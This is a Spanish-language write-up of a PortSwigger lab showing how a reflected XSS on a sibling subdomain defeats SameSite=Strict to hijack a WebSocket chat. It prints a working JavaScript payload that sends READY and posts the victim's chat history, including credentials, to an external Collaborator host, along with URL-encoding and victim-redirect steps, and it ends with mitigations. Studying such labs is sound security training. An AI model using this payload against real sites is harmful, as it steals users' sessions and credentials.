
---

# Bypass de SameSite Strict con dominio hermano (CSWSH via sibling domain)

## 1. Introducción

En este laboratorio explotamos una funcionalidad de **Cross-Site WebSocket Hijacking (CSWSH)** para exfiltrar el historial de chat de la víctima (que en este escenario contiene credenciales en texto claro).  
La protección SameSite=Strict impide el envío de cookies en peticiones cross-site, pero el sitio tiene una versión _hermana_ (`cms...`) que forma parte del mismo _site_ del navegador y es vulnerable a XSS reflejada. Al combinar la XSS en el dominio hermano con una conexión WebSocket legítima al dominio principal, podemos provocar que el navegador establezca una conexión autenticada (misma _site_ → se envían cookies), enviar el mensaje `READY` y exfiltrar la respuesta a un servidor externo.

[Ver laboratorio Portswigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

---

## 2. Contexto de la vulnerabilidad

Componentes relevantes:

- Live chat en el dominio principal (`YOUR-LAB-ID.web-security-academy.net`) que utiliza WebSocket (`wss://.../chat`).
    
- La cookie de sesión se establece con `SameSite=Strict`; por tanto, el navegador **no** la incluye en peticiones cross-site normales.
    
- El chat responde con el historial completo cuando el cliente envía un mensaje `READY`.
    
- Existe un dominio _hermano_ (por ejemplo `cms-YOUR-LAB-ID.web-security-academy.net`) que forma parte del **mismo site** a ojos del navegador (mismo registrable domain) y que es vulnerable a **XSS reflejada** en el parámetro `username` del login.
    
- Las respuestas del dominio hermano cuentan con cabeceras que revelan su existencia (por ejemplo `Access-Control-Allow-Origin` apuntando a ese subdominio), y además su página de login refleja el `username` sin sanitizar.
    

Consecuencia: podemos usar la XSS en el dominio _cms_ para ejecutar JavaScript en un contexto que el navegador considera **same-site** respecto al dominio del chat. Eso permite abrir un WebSocket autenticado (la cookie de sesión será enviada) y leer/exfiltrar el historial.

---

## 3. Análisis de peticiones y comportamiento observado

### 3.1 Comprobación del chat (flujo legítimo)

- Al abrir la página del chat autenticado, hay una conexión WebSocket con un _handshake_:
    
    ```
    GET /chat HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Upgrade: websocket
    Connection: Upgrade
    Cookie: session=...
    ```
    
- Tras la conexión, al recibir el servidor el mensaje `READY`, éste responde con el historial de chat (mensajes previos, que incluyen credenciales en este laboratorio).
    

### 3.2 Prueba inicial de CSWSH desde dominio externo

- Si intentamos abrir un WebSocket desde un dominio externo (p. ej. exploit-server), la petición de _handshake_ **no incluye** la cookie de sesión (SameSite=Strict lo impide), por lo que no conseguimos el historial de la cuenta de la víctima.
    
- Por eso necesitamos ejecutar el WebSocket desde **un contexto que el navegador considere same-site** respecto del dominio del chat.
    

### 3.3 Detección del dominio hermano vulnerable

- Revisando recursos (scripts, imágenes) observamos respuestas que exponen `cms-YOUR-LAB-ID.web-security-academy.net`.
    
- En ese subdominio encontramos una página `/login` que refleja `username` en el cuerpo de la respuesta sin escapar → XSS reflejada comprobada con `"<script>alert(1)</script>"`.
    

---

## 4. Preparación del exploit — idea general

1. Construir un pequeño script que:
    
    - Abra `wss://YOUR-LAB-ID.web-security-academy.net/chat`
        
    - En `onopen` envíe `READY`
        
    - En `onmessage` reenvíe el contenido (historial) a un endpoint externo controlado (por ejemplo, un Burp Collaborator o cualquier receptor HTTP)
        
2. Colocar ese script como valor del parámetro `username` en la página de login del dominio _cms_ (XSS reflejada).
    
3. Forzar al navegador de la víctima a visitar esa URL en el dominio _cms_ (esto ejecuta la XSS en un contexto same-site) — al ejecutarse, el script abre el WebSocket autenticado y exfiltra la respuesta.
    
4. Recoger la exfiltración en el servidor receptor y extraer credenciales.
    

A continuación explico cada paso con mucho detalle y ejemplos de código.

---

## 5. Explotación paso a paso (detallado)

> Notas previas: en el laboratorio se usa un servidor de prueba externo (Burp Collaborator) para recibir datos. En producción o fuera de un entorno de laboratorio esto sería actividad maliciosa; aquí lo explicamos con fines formativos y sobre el objetivo de laboratorio.

### 5.1 Script WebSocket de base (lo que queremos ejecutar dentro de la XSS)

```javascript
<script>
  var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
  ws.onopen = function() {
    // Solicita al servidor que envíe el historial
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    // Exfiltramos el mensaje (historial) a nuestro servidor receptor
    fetch('https://YOUR-COLLAB-PAYLOAD.oastify.com', {
      method: 'POST',
      mode: 'no-cors',
      body: event.data
    });
  };
</script>
```

Explicación línea a línea:

- `new WebSocket('wss://.../chat')`: inicia el _handshake_ WebSocket. Si se ejecuta en un contexto same-site, el navegador incluirá la cookie de sesión en la petición de handshake.
    
- `onopen`: cuando la conexión se establece, enviamos `"READY"` — el trigger que, por diseño del chat, hace que el servidor devuelva todo el historial de la sesión autenticada.
    
- `onmessage`: cada vez que el servidor envía datos (el historial), capturamos `event.data` y hacemos un `fetch` hacia nuestro receptor externo. `mode: 'no-cors'` evita que el navegador lance errores por CORS y permite hacer el POST hacia un dominio externo aunque no haya cabeceras CORS (aunque la petición será "opaque" y el body puede no estar accesible para leer la respuesta, sí llegará el cuerpo al endpoint receptor).
    

### 5.2 Probar el script en tu propio navegador (control)

- Insertando el script en una página cargada bajo el dominio principal (mismo origen), deberías ver en el receptor externo la llegada de datos cuando el chat responda.
    
- Si el WebSocket se abre sin cookie → el servidor no devuelve historial. Si el WebSocket se abre con cookie → recibes el historial.
    

### 5.3 Convertir el script en payload para XSS (URL encoding)

- La XSS en `cms` se activa al pasar el script como valor del parámetro `username` (por ejemplo `https://cms-YOUR-LAB-ID/.../login?username=...`).
    
- Para incluir el script en la URL es necesario **URL-encode** todo el código JS (escapar `<`, `>`, espacios, etc.). Por ejemplo, `<` → `%3C`, `>` → `%3E`, espacios → `%20`, etc.
    
- Herramientas útiles: `encodeURIComponent(...)` en consola, o cualquier encoder online.
    

Ejemplo (abreviado — en práctica encodea todo el script):

```
%3Cscript%3Evar%20ws%20%3D%20new%20WebSocket('wss%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2Fchat')%3B...%3C%2Fscript%3E
```

### 5.4 Construir la URL final que ejecuta la XSS en el dominio hermano

Una vez codificado, incrustas el payload en `username` y navegas a:

```
https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=URL_ENCODED_JS&password=anything
```

Al abrir esa URL en el navegador de la víctima (por ejemplo, porque la recibe y hace clic o porque se la rediriges desde el exploit server), el servidor responde con la página que refleja `username` sin escape, por lo que el navegador ejecuta el JavaScript inyectado.

### 5.5 Qué ocurre cuando se ejecuta la XSS en el dominio hermano

- El script se ejecuta en un contexto considerado **same-site** por el navegador con respecto al dominio principal (mismo registrable domain).
    
- `new WebSocket('wss://YOUR-LAB-ID/.../chat')` realiza un handshake y el navegador **incluye la cookie de sesión** en la petición (porque el contexto es same-site).
    
- El servidor del chat recibe una conexión autenticada, y cuando recibe `READY` envía el historial de chat (en este laboratorio, esa información contiene credenciales).
    
- El `onmessage` del script envía ese historial al servidor externo que controlamos (receptor), donde podremos consultarlo y extraer usuario/contraseña en texto claro.
    

### 5.6 Recolección de datos en el servidor receptor

- El endpoint receptor (p. ej. Burp Collaborator, OAST, servidor propio) recibe POSTs con los cuerpos que contienen el historial.
    
- Revisa las entradas; una contendrá mensajes que incluyen usuario y contraseña.
    
- Con esas credenciales puedes iniciar sesión en la cuenta de la víctima localmente (en el laboratorio) y verificar que el exploit ha funcionado.
    

---

## 6. Publicación y verificación del exploit

Pasos concretos para publicar el exploit en el servidor del laboratorio (exploit server):

1. Codifica el script WebSocket completo usando `encodeURIComponent`.
    
2. Construye la URL de `cms` poniendo la porción codificada en `username`.
    
3. En el exploit server, crea una página que redirija automáticamente al usuario a esa URL en `cms` (por ejemplo con `document.location = "https://cms-.../login?username=...&password=x";`).
    
4. Guarda el exploit, usa “View exploit” para probarlo en tu navegador — al cargar la página se redirigirá al `cms` y se ejecutará la XSS.
    
5. En el servidor receptor, observa la llegada de datos (historial). Confirma que el historial incluye credenciales.
    
6. Con las credenciales, entra en la cuenta objetivo y valida la explotación (resolver lab).
    

---

## 7. Fundamentación técnica

¿Por qué funciona esta cadena?

- SameSite = Strict evita envío de cookies en peticiones cross-site **desde** otro sitio. Pero aquí **no** abrimos el WebSocket desde un sitio distinto; ejecutamos código en un subdominio que el navegador considera parte del mismo _site_ → cookies sí viajan.
    
- La XSS en el dominio _cms_ actúa como "gadget" que nos permite ejecutar código en un contexto con privilegios suficientes (misma _site_).
    
- WebSockets usan el mismo mecanismo de cookies en el handshake: si el origen del script es same-site, la cookie de sesión se incluye en la petición de _handshake_.
    
- El servidor de chat confía en la sesión y responde con datos sensibles ante el mensaje `READY`.
    
- `fetch(..., mode: 'no-cors')` permite que el script envíe los datos a nuestro receptor sin que el navegador bloquee la petición por CORS; la petición será de tipo "opaque" pero el cuerpo sí llegará al servidor receptor.
    

La combinación XSS (sibling domain) + WebSocket autenticado = CSWSH exitoso.

---

## 8. Conclusión

Este laboratorio ilustra una lección clave:

- Las protecciones del navegador (SameSite) y del servidor pueden ser insuficientes cuando existe un **subdominio hermano vulnerable**.
    
- XSS en un dominio hermanado puede convertir un entorno que inicialmente parecía seguro en completamente comprometido, porque el navegador comparte contexto _site_ y envía cookies en operaciones que desde fuera serían bloqueadas.
    
- WebSockets son un vector poderoso para exfiltrar datos si la aplicación responde con información sensible en eventos (p. ej. `READY`) y no exige autenticaciones adicionales o tokens por mensaje.
    

---

## 9. Mitigaciones

Para evitar esta clase de ataques combinados:

1. Evitar que subdominios inseguros compartan cookies de sesión (marcar cookies con `Domain` restrictivo o usar subdominios aislados con cookies distintas).
    
2. Aplicar `HttpOnly`, `Secure` y SameSite apropiado, pero tener en cuenta que SameSite por sí solo no protege contra XSS en subdominios del mismo site.
    
3. Corregir todas las XSS: sanear y escapar cualquier dato reflejado en HTML; usar CSP robusta.
    
4. No incluir credenciales ni información sensible en tráfico de chat; no enviar datos delicados en respuestas automáticas.
    
5. En WebSocket, aplicar autenticación por token adicional (p. ej. un token por conexión derivado en el servidor y no accesible desde DOM) y no confiar únicamente en cookies.
    
6. Para endpoints sensibles, exigir revalidación o workflows que no dependan exclusivamente de la sesión.
    
7. Monitorear y limitar la exposición de recursos entre subdominios (CORS, cabeceras revealing, etc.).
    

---

## Resumen conceptual clave

- El bypass aprovecha la existencia de un **dominio hermano vulnerable a XSS** que forma parte del mismo _site_ del navegador.
    
- La XSS permite ejecutar un WebSocket autenticado (cookie enviada) que, con un simple `READY`, produce la emisión del historial de chat.
    
- Exfiltrando el mensaje mediante un `fetch` a un receptor controlado, se obtienen credenciales en texto claro.
    
- La lección: proteger cada subdominio con la misma rigurosidad y no confiar solo en SameSite.
    

---
